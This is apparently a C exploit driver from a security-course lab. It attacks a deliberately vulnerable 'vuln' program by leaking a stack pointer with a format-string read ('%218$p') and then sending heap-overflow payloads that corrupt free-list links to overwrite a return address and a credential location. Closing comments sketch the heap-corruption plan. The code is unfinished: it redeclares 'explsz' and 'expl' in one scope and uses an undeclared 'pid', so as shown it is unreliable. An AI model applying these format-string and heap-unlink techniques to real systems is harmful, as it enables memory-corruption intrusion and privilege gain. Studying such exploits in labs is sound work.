#include <sys/wait.h>
#include "driver_base.h"
#include "constants.h"

int main() {
    char *nargv[3] = { "vuln", STRINGIFY(GRP), NULL };

    // Fork subprocess vuln
    create_subproc("./vuln", nargv);
    fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
            "vuln, go ahead and do that now. Press 'enter' when you are ready\n"
            "to continue with the exploit\n");

    getchar();
    get_formatted("%*s"); // Needed to clear out the Welcome message

    put_str("e %218$p\n");
    send();
    uint64_t cur_main_bp;
    get_formatted("%p", &cur_main_bp);
    fprintf(stderr, "driver: Extracted cur_main_bp=%lx\n", cur_main_bp);

    uint64_t cur_auth_bp = cur_main_bp + auth_main_bp_dist;
    uint64_t cur_return_addr_loc = cur_auth_bp + 8;    
    uint64_t curr_auth_cred = cur_auth_bp - auth_bp_cred_dist;
    

    put_str("u 1234567\n");
    send();
    get_formatted("%*s");

    unsigned explsz = 528;
    void* *expl = (void**)malloc(explsz);
    // Initialize the buffer with '\1' to make the contents predictable.
    memset((void*)expl, '\1', explsz);
    expl[explsz/sizeof(void*)-4] = (void*) 0x0000000000000000;
    expl[explsz/sizeof(void*)-3] = (void*) 0x00000000000001f0;
    expl[explsz/sizeof(void*)-2] = (void*) cur_return_addr_loc;
    expl[explsz/sizeof(void*)-1] = (void*) curr_auth_cred;

    put_str("p ");
    put_bin((char*)expl, explsz);
    put_str("\n");
    send();



    put_str("u 1234567\n");
    send();
    get_formatted("%*s");

    unsigned explsz = 504;
    void* *expl = (void**)malloc(explsz);
    // Initialize the buffer with '\1' to make the contents predictable.
    memset((void*)expl, '\1', explsz);
    expl[explsz/sizeof(void*)-1] = (void*) 0x0000040000000001;

    put_str("p ");
    put_bin((char*)expl, explsz);
    put_str("\n");
    send();

    get_formatted("%*s");

    usleep(100000);

    kill(pid, SIGINT);
    int status;
    wait(&status);
    display_vuln_status(status);

    return 0;
}


// current->next->prev = current->prev;

// Send p
// Send u with overflow to set prev = stack addr
// Send p with overflow to set in use = 0, prev = cred
// Send u
// Send p with overflow to set size=1024
// Send l


/*

    p -> u(size=1024)    p -> u (in_use=0, next=p, prev=<cred>)      p (prev=<stack_addr>)





    p -> u (size=1024) -> p -> u (in_use = 0, prev = cred) -> p (prev=stackaddr)





    c00
    c10

    e00
    e10

*/
